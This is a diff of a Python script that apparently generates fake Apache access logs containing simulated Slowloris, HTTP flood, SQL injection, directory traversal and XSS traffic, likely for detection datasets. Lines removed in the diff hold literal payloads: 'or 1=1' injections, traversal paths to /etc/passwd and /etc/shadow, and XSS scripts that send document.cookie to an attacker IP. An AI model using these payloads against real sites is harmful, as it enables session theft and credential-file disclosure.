+    "/blog/" + fake.word(), "/messages", "/merch", "/contact-us", "/.robots.txt")
+    dircho2 = random.choice(direct2)
+    logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (
+    src, ts, msg, dircho2, resp, size, mysite, dircho, ag))
+    if sec >= 60:
+        min += 1
+        sec -= 60
+    if min >= 60:
+        hour += 1
+        min = 0
+    if hour >= 24:
+        randate = randate + datetime.timedelta(days=1)
+        hour = 0
 
     logger.handlers.clear()
-    traf+=1
-    m=0
-
-
-
-
-
+    traf += 1
+    m = 0
 
 
 def txtbox():
-    global txt,text
+    global txt, text
     txt.config(state=NORMAL)
     txt.insert(INSERT, text + '\n')
     txt.yview_pickplace("end")
     txt.config(state=DISABLED)
 
 
+# ----------------------------Attacks-------------------------------
 
 
-
-#----------------------------Attacks-------------------------------
-
+# ----------------------------DoS/DDoS-------------------------------
 
 
-
-#----------------------------DoS/DDoS-------------------------------
-
-
+# Creates a Slowloris DoS attack
+dec = 0
 
 
-#Creates a Slowloris DoS attack
-dec =0
 def slowloris():
-    global randate, hour, min, sec, ms, mysite, ts, traf, amount, lownslow, trafcyc, loristime,packonce
-    t=0
-    #Generate Destination IP
-    g=1
+    global randate, hour, min, sec, ms, mysite, ts, traf, amount, lownslow, trafcyc, loristime, packonce
+    t = 0
+    # Generate Destination IP
+    g = 1
     ag = agent.random
-    n=time.localtime()
-    resp=408
-    amount =int(pack)
+    n = time.localtime()
+    resp = 408
+    amount = int(pack)
 
     while g <= trafcyc and traf <= amount:
         if lownslow == True:
-            msg ="POST"
+            msg = "POST"
         else:
-            msg="GET"
+            msg = "GET"
 
-        srcport = random.randint(0,65535)
+        srcport = random.randint(0, 65535)
         desport = 80
-        size=0
-        dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
+        size = 0
+        dt = datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
         st = datetime.datetime.combine(randate, dt)
         ts = st.strftime('%d/%b/%Y:%H:%M:%S')
         logging.basicConfig(level=logging.INFO, format='%(message)s')
         logger = logging.getLogger()
         logger.addHandler(logging.FileHandler(name, 'a'))
-        id=random.randint(0,2000)
-        logger.info('%s - - [%s +0000] "%s / %s HTTP/1.1" %s %s "-" "%s"' % (dsrc,ts,msg,id,resp,size,ag))
+        id = random.randint(0, 2000)
+        logger.info('%s - - [%s +0000] "%s / %s HTTP/1.1" %s %s "-" "%s"' % (dsrc, ts, msg, id, resp, size, ag))
 
         if t == packonce:
-            sec+=loristime
-            t-=packonce
+            sec += loristime
+            t -= packonce
             if resp == 400:
                 resp = 408
             elif resp == 408:
                 resp = 400
-        t+=1
-        while sec>= 60:
-            min+=1
-            sec-=60
+        t += 1
+        while sec >= 60:
+            min += 1
+            sec -= 60
 
-        while min>=60:
-            hour+=1
-            min-=60
+        while min >= 60:
+            hour += 1
+            min -= 60
 
-        while hour>=24:
+        while hour >= 24:
             randate = randate + datetime.timedelta(days=1)
-            hour-=60
+            hour -= 60
 
         logger.handlers.clear()
-        g+=1
-        traf +=1
-        trafspring = random.randint(1,25)
+        g += 1
+        traf += 1
+        trafspring = random.randint(1, 25)
         if trafspring == 2 and dal == 1:
             onewhite()
-        attackspring = random.randint(1,attfreq)
+        attackspring = random.randint(1, attfreq)
         if attackspring == 1:
             insidedosatt()
-    g=0
-    t-=packonce
-
-
-
+    g = 0
+    t -= packonce
 
 
 def httpflood():
-    global randate, hour, min, sec, ms,ddos, amount, traf, trafcyc,amount, GETFlood, ag
+    global randate, hour, min, sec, ms, ddos, amount, traf, trafcyc, amount, GETFlood, ag
     global ts
-    amount =int(pack)
-    g=1
+    amount = int(pack)
+    g = 1
 
-    t=0
+    t = 0
     while g <= trafcyc and traf <= amount:
-        resp=408
+        resp = 408
         if ddos == True:
             global dsrc
             bits = getrandbits(32)
@@ -1010,118 +982,195 @@ def httpflood():
             dsrc = str(addr)
             ag = agent.random
         if GETFlood == True:
-            msg ="GET"
+            msg = "GET"
         else:
-            msg="POST"
+            msg = "POST"
 
-        srcport = random.randint(0,65535)
+        srcport = random.randint(0, 65535)
         desport = 80
-        size=394
-        resp=200
-        id=random.randint(0,2000)
-        dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
+        size = 394
+        resp = 200
+        id = random.randint(0, 2000)
+        dt = datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
         st = datetime.datetime.combine(randate, dt)
         ts = st.strftime('%d/%b/%Y:%H:%M:%S')
         logging.basicConfig(level=logging.INFO, format='%(message)s')
         logger = logging.getLogger()
         logger.addHandler(logging.FileHandler(name, 'a'))
 
-        logger.info('%s - - [%s +0000] "%s / %s HTTP/1.1" %s %s "-" "%s"' % (dsrc,ts,msg,id,resp,size,ag))
-        t+=1
-        g+=1
+        logger.info('%s - - [%s +0000] "%s / %s HTTP/1.1" %s %s "-" "%s"' % (dsrc, ts, msg, id, resp, size, ag))
+        t += 1
+        g += 1
         traf += 1
         if t >= packonce:
             sec += 1
             t -= packonce
 
-        while sec>= 60:
-            min+=1
-            sec-=60
-        while min>=60:
-            hour+=1
-            min=0
-        while hour>=24:
+        while sec >= 60:
+            min += 1
+            sec -= 60
+        while min >= 60:
+            hour += 1
+            min = 0
+        while hour >= 24:
             randate = randate + datetime.timedelta(days=1)
-            hour=0
+            hour = 0
         logger.handlers.clear()
 
-        trafspring = random.randint(1,3)
+        trafspring = random.randint(1, 3)
         if trafspring == 2 and dal == 1:
             onewhite()
-        attackspring = random.randint(1,attfreq)
+        attackspring = random.randint(1, attfreq)
         if attackspring == 1:
             insidedosatt()
 
-
-    t-=packonce
-    g=0
-
+    t -= packonce
+    g = 0
 
 
-#----------------------------Application Based Attacks-------------------------------
+# ----------------------------Application Based Attacks-------------------------------
 
 def sqlattack():
     global randate, hour, min, sec, ms, traf, ddos, src
-    t=0
+    t = 0
+
     def srcip():
         global src
         bits = getrandbits(32)
         addr = IPv4Address(bits)
         src = str(addr)
-    srcip()
 
+    srcip()
 
     if ddos == False:
         src = dsrc
     ag = agent.random
-    resp=200
-    msg="GET"
-    size=random.randint(1000,8000)
-    tz= -7000
-    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
+    resp = 200
+    msg = "GET"
+    size = random.randint(1000, 8000)
+    tz = -7000
+    dt = datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
     st = datetime.datetime.combine(randate, dt)
     ts = st.strftime('%d/%b/%Y:%H:%M:%S')
     logging.basicConfig(level=logging.INFO, format='%(message)s')
     logger = logging.getLogger()
     logger.addHandler(logging.FileHandler(name, 'a'))
-    dircho= "search/"
-    sqlichoice=random.randint(1,4)
 
+    filechoice = random.randint(1, 16)
+    if filechoice == 0:
+        dircho = "register2.php"
+    elif filechoice == 1:
+        dircho = "register.php"
+    elif filechoice == 2:
+        dircho = "search.php"
+    elif filechoice == 3:
+        dircho = "login.php"
+    elif filechoice == 4:
+        dircho = "index.php"
+    elif filechoice == 5:
+        dircho = "main2.php"
+    elif filechoice == 6:
+        dircho = "main3.php"
+    elif filechoice == 7:
+        dircho = "main4.php"
+    elif filechoice == 8:
+        dircho = "main.php"
+    elif filechoice == 9:
+        dircho = "main1.php"
+    elif filechoice == 10:
+        dircho = "main5.php"
+    elif filechoice == 11:
+        dircho = "main6.php"
+    elif filechoice == 12:
+        dircho = "main7.php"
+    elif filechoice == 13:
+        dircho = "main8.php"
+    elif filechoice == 14:
+        dircho = "main9.php"
+    elif filechoice == 15:
+        dircho = "main10.php"
+    elif filechoice == 16:
+        dircho = "main11.php"
 
-    if sqlichoice == 1:
-        dircho2="login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit"
-    elif sqlichoice == 2:
-        dircho2="login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit"
-    elif sqlichoice == 3:
-        dircho2="login/?id=admin%27+--"
-    elif sqlichoice == 4:
-        dircho2="login/?id=%27+or+1=1%23"
-    elif sqlichoice == 5:
-        dircho2="?id=%27%29+or+%271%27%3D%271--"
+    # for paramchoice in range(16):
+    paramchoice = random.randint(1, 15)
+    if paramchoice == 1:
+        param = "?id="
+    elif paramchoice == 2:
+        param = "?name="
+    elif paramchoice == 3:
+        param = "?searchField="
+    elif paramchoice == 4:
+        param = "?email="
+    elif paramchoice == 5:
+        param = "?password="
+    elif paramchoice == 6:
+        param = "?name1="
+    elif paramchoice == 7:
+        param = "?name2="
+    elif paramchoice == 8:
+        param = "?name3="
+    elif paramchoice == 9:
+        param = "?name4="
+    elif paramchoice == 10:
+        param = "?name5="
+    elif paramchoice == 11:
+        param = "?name6="
+    elif paramchoice == 12:
+        param = "?name7="
+    elif paramchoice == 13:
+        param = "?name8="
+    elif paramchoice == 14:
+        param = "?name9="
+    elif paramchoice == 15:
+        param = "?name10="
 
-    logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho2,resp,size,mysite,dircho,ag))
+    pagechoice = random.randint(1, 5)
 
-    t+=1
+    if pagechoice == 1:
+        page = "main/"
+    elif pagechoice == 2:
+        page = "test/"
+    elif pagechoice == 3:
+        page = "mainpage/"
+    elif pagechoice == 4:
+        page = "index.html/"
+    elif pagechoice == 5:
+        page = "search/"
+
+    i = 0
+    sqlFile = open('Text/SQLInject.txt', 'r')
+    for line in sqlFile:
+        sqlichoice = random.randint(1, 274)
+        i += 1
+        if sqlichoice == i:
+            dircho2 = line.rstrip('\n')
+            logger.info('%s - - [%s +0000] "%s /%s%s%s HTTP/1.1" %s %s "%s%s" "%s"' % (
+            src, ts, msg, dircho, param, dircho2, resp, size, mysite, page, ag))
+
+    t += 1
     if t >= 420:
         sec += 1
         t -= 420
 
-    while sec>= 60:
-            min+=1
-            sec-=60
-    while min>=60:
-        hour+=1
-        min=0
-    while hour>=24:
+    while sec >= 60:
+        min += 1
+        sec -= 60
+    while min >= 60:
+        hour += 1
+        min = 0
+    while hour >= 24:
         randate = randate + datetime.timedelta(days=1)
-        hour=0
-    traf+=1
+        hour = 0
+    traf += 1
 
     logger.handlers.clear()
+
 
 def dotdotslash():
     global randate, hour, min, sec, ms, traf, ddos, src
-    t=0
+    t = 0
+
     def srcip():
         global src
         bits = getrandbits(32)
@@ -1132,71 +1181,136 @@ def dotdotslash():
     if ddos == False:
         src = dsrc
     ag = agent.random
-    resp=200
-    msg="GET"
-    size=random.randint(1000,8000)
-    tz= -7000
-    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
+    resp = 200
+    msg = "GET"
+    size = random.randint(1000, 8000)
+    tz = -7000
+    dt = datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
     st = datetime.datetime.combine(randate, dt)
     ts = st.strftime('%d/%b/%Y:%H:%M:%S')
     logging.basicConfig(level=logging.INFO, format='%(message)s')
     logger = logging.getLogger()
     logger.addHandler(logging.FileHandler(name, 'a'))
-    dircho= "search/"
-    slashchoice=random.randint(1,5)
-    filechoice=random.randint(1,4)
+    # filechoice=random.randint(1,4)
 
-    direct=("about","search","search/"+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
-    dircho= random.choice(direct)
+    # direct=("about","search","search/"+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
+    # dircho= random.choice(direct)
 
-
-    if filechoice == 1:
-        dircho3="get.php?file="
+    filechoice = random.randint(1, 16)
+    # for filechoice in range(16):
+    if filechoice == 0:
+        dircho = "register2.php"
+    elif filechoice == 1:
+        dircho = "register.php"
     elif filechoice == 2:
-        dircho3="get-files?file="
+        dircho = "search.php"
     elif filechoice == 3:
-        dircho3="main.cgi?file="
+        dircho = "login.php"
     elif filechoice == 4:
-        dircho3=""
+        dircho = "index.php"
+    elif filechoice == 5:
+        dircho = "main2.php"
+    elif filechoice == 6:
+        dircho = "main3.php"
+    elif filechoice == 7:
+        dircho = "main4.php"
+    elif filechoice == 8:
+        dircho = "main.php"
+    elif filechoice == 9:
+        dircho = "main1.php"
+    elif filechoice == 10:
+        dircho = "main5.php"
+    elif filechoice == 11:
+        dircho = "main6.php"
+    elif filechoice == 12:
+        dircho = "main7.php"
+    elif filechoice == 13:
+        dircho = "main8.php"
+    elif filechoice == 14:
+        dircho = "main9.php"
+    elif filechoice == 15:
+        dircho = "main10.php"
+    elif filechoice == 16:
+        dircho = "main11.php"
 
-    if slashchoice == 1:
-        dircho2="../../../../etc/passwd"
-    elif slashchoice == 2:
-        dircho2="../../../../etc/shadow"
-    elif slashchoice == 3:
-        dircho2="..\..\..\..\..\..\winnt\win.ini"
-    elif slashchoice == 4:
-        dircho2="../../../../apache/logs/access.log"
-    elif slashchoice == 5:
-        dircho2="../../../../apache/logs/error.log"
+    paramchoice = random.randint(1, 15)
+    # for paramchoice in range(16):
+    if paramchoice == 1:
+        param2 = "?file="
+    elif paramchoice == 2:
+        param2 = "?file1="
+    elif paramchoice == 3:
+        param2 = "?file2="
+    elif paramchoice == 4:
+        param2 = "?file3="
+    elif paramchoice == 5:
+        param2 = "?file4="
+    elif paramchoice == 6:
+        param2 = "?file5="
+    elif paramchoice == 7:
+        param2 = "?file6="
+    elif paramchoice == 8:
+        param2 = "?file7="
+    elif paramchoice == 9:
+        param2 = "?file8="
+    elif paramchoice == 10:
+        param2 = "?file9="
+    elif paramchoice == 11:
+        param2 = "?file10="
+    elif paramchoice == 12:
+        param2 = "?file11="
+    elif paramchoice == 13:
+        param2 = "?file12="
+    elif paramchoice == 14:
+        param2 = "?file13="
+    elif paramchoice == 15:
+        param2 = "?file14="
 
+    pagechoice = random.randint(1, 5)
+    if pagechoice == 1:
+        page = "main/"
+    elif pagechoice == 2:
+        page = "test/"
+    elif pagechoice == 3:
+        page = "mainpage/"
+    elif pagechoice == 4:
+        page = "index.html/"
+    elif pagechoice == 5:
+        page = "search/"
 
+    i = 0
+    dttFile = open('Text/DotDotSlashAttack.txt', 'r')
+    for line in dttFile:
+        slashchoice = random.randint(1, 300)
+        i += 1
+        if slashchoice == i:
+            dircho2 = line.rstrip('\n')
+            logger.info('%s - - [%s +0000] "%s /%s%s%s HTTP/1.1" %s %s "%s%s" "%s"' % (
+            src, ts, msg, dircho, param2, dircho2, resp, size, mysite, page, ag))
 
-    logger.info('%s - - [%s +0000] "%s %s%s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho3,dircho2,resp,size,mysite,dircho,ag))
-
-    t+=1
+    t += 1
     if t >= 420:
         sec += 1
         t -= 420
 
-    while sec>= 60:
-        min+=1
-        sec-=60
-    while min>=60:
-        hour+=1
-        min=0
-    while hour>=24:
+    while sec >= 60:
+        min += 1
+        sec -= 60
+    while min >= 60:
+        hour += 1
+        min = 0
+    while hour >= 24:
         rndate = randate + datetime.timedelta(days=1)
-        hour=0
+        hour = 0
 
-    traf +=1
+    traf += 1
     logger.handlers.clear()
-
 
 
 def xss():
     global randate, hour, min, sec, ms, traf, ddos, src
-    t=0
+    t = 0
+
     def srcip():
         global src
         bits = getrandbits(32)
@@ -1210,6 +1324,7 @@ def xss():
         bits = getrandbits(32)
         addr = IPv4Address(bits)
         atip = str(addr)
+
     def malurl():
         global murl
         murl = random.randint(1000, 999999)
@@ -1217,69 +1332,126 @@ def xss():
     if ddos == False:
         src = dsrc
     ag = agent.random
-    resp=200
-    msg="GET"
-    size=random.randint(1000,8000)
-    tz= -7000
-    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
+    resp = 200
+    msg = "GET"
+    size = random.randint(1000, 8000)
+    tz = -7000
+    dt = datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
     st = datetime.datetime.combine(randate, dt)
     ts = st.strftime('%d/%b/%Y:%H:%M:%S')
     logging.basicConfig(level=logging.INFO, format='%(message)s')
     logger = logging.getLogger()
     logger.addHandler(logging.FileHandler(name, 'a'))
-    dircho= "search/"
-    xsschoice=random.randint(1,5)
-    filechoice=random.randint(1,4)
 
-
-    if filechoice == 1:
-        dircho3="?name="
+    # for filechoice in range(16):
+    filechoice = random.randint(1, 16)
+    if filechoice == 0:
+        dircho = "register2.php"
+    elif filechoice == 1:
+        dircho = "register.php"
     elif filechoice == 2:
-        dircho3="?search="
+        dircho = "search.php"
     elif filechoice == 3:
-        dircho3="?file="
+        dircho = "login.php"
     elif filechoice == 4:
-        dircho3="?p="
+        dircho = "index.php"
+    elif filechoice == 5:
+        dircho = "main2.php"
+    elif filechoice == 6:
+        dircho = "main3.php"
+    elif filechoice == 7:
+        dircho = "main4.php"
+    elif filechoice == 8:
+        dircho = "main.php"
+    elif filechoice == 9:
+        dircho = "main1.php"
+    elif filechoice == 10:
+        dircho = "main5.php"
+    elif filechoice == 11:
+        dircho = "main6.php"
+    elif filechoice == 12:
+        dircho = "main7.php"
+    elif filechoice == 13:
+        dircho = "main8.php"
+    elif filechoice == 14:
+        dircho = "main9.php"
+    elif filechoice == 15:
+        dircho = "main10.php"
+    elif filechoice == 16:
+        dircho = "main11.php"
 
-    if xsschoice == 1:
-        attip()
-        dircho2="%3Cscript%3Ewindow.location%3D'http%3A%2F%2F"+str(atip)+"%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E"
-    elif xsschoice == 2:
-        attip()
-        dircho2="%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F"+str(atip)+"%22%3C%2Fscript%3E"
-    elif xsschoice == 3:
-        attip()
-        malurl()
-        dircho2="%3Cscript%3E%window.open%28%27http%3A%2F%2F"+str(atip)+"%2F"+str(murl)+"%27%293C%2Fscript%3E"
-    elif xsschoice == 4:
-        attip()
-        malurl()
-        dircho2="%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F"+str(atip)+"%2F"+str(murl)+".js%3D%3E%3C%2Fscript%3E"
-    elif xsschoice == 5:
-        dircho2="%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E"
+    # for paramchoice in range(16):
+    paramchoice = random.randint(1, 15)
+    if paramchoice == 1:
+        param3 = "?id="
+    elif paramchoice == 2:
+        param3 = "?name="
+    elif paramchoice == 3:
+        param3 = "?searchField="
+    elif paramchoice == 4:
+        param3 = "?email="
+    elif paramchoice == 5:
+        param3 = "?password="
+    elif paramchoice == 6:
+        param3 = "?name1="
+    elif paramchoice == 7:
+        param3 = "?name2="
+    elif paramchoice == 8:
+        param3 = "?name3="
+    elif paramchoice == 9:
+        param3 = "?name4="
+    elif paramchoice == 10:
+        param3 = "?name5="
+    elif paramchoice == 11:
+        param3 = "?name6="
+    elif paramchoice == 12:
+        param3 = "?name7="
+    elif paramchoice == 13:
+        param3 = "?name8="
+    elif paramchoice == 14:
+        param3 = "?name9="
+    elif paramchoice == 15:
+        param3 = "?name10="
 
+    pagechoice = random.randint(1, 5)
+    if pagechoice == 1:
+        page = "main/"
+    elif pagechoice == 2:
+        page = "test/"
+    elif pagechoice == 3:
+        page = "mainpage/"
+    elif pagechoice == 4:
+        page = "index.html/"
+    elif pagechoice == 5:
+        page = "search/"
 
+    i = 0
+    xssFile = open('Text/XSSAttack.txt', 'r')
+    for line in xssFile:
+        xsschoice = random.randint(1, 1385)
+        i += 1
+        if xsschoice == i:
+            dircho2 = line.rstrip('\n')
+            logger.info('%s - - [%s +0000] "%s /%s%s%s HTTP/1.1" %s %s "%s%s" "%s"' % (
+            src, ts, msg, dircho, param3, dircho2, resp, size, mysite, page, ag))
 
-    logger.info('%s - - [%s +0000] "%s /%s%s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho3,dircho2,resp,size,mysite,dircho,ag))
-
-    t+=1
+    t += 1
     if t >= 420:
         sec += 1
         t -= 420
 
-    while sec>= 60:
-        min+=1
-        sec-=60
-    while min>=60:
-        hour+=1
-        min=0
-    while hour>=24:
+    while sec >= 60:
+        min += 1
+        sec -= 60
+    while min >= 60:
+        hour += 1
+        min = 0
+    while hour >= 24:
         randate = randate + datetime.timedelta(days=1)
-        hour=0
+        hour = 0
 
-    traf +=1
+    traf += 1
     logger.handlers.clear()
-
 
 
 Apache()
